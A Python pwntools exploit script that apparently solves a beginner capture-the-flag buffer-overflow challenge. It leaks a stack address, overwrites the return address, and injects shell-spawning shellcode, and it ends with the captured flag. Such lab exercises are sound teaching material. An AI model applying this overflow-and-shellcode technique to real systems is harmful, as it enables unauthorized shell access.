#!/usr/bin/env python3
import pwn
import vpn_conf
import sys

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 2)
EXE_FILENAME = "./bof101_x86"
OFFSET_RIP = 44

# HOW TO FIND FIND THE OFFSET
# pattern = pwn.cyclic(100)
# io = pwn.process(bin)
# io.sendline(pattern)
# offset = pwn.cyclic_find(0x6161616C)


def start():
    print(sys.argv)
    if sys.argv[1] == "remote":
        return pwn.remote(HOST, PORT)
    return pwn.process(EXE_FILENAME)


if __name__ == "__main__":
    io = start()
    leaked_address = io.recvuntil(b"&x=")
    leaked_address = io.recvline().strip().decode()
    io.sendline(
        b"a" * OFFSET_RIP
        + pwn.p64(int(leaked_address, 16))
        + pwn.asm("nop") * 50
        + pwn.asm(pwn.shellcraft.sh())
    )

    io.interactive()


# FLAG : BASC{Congratz_U_3Xpl0it3d_your_f1r5t_BOF}
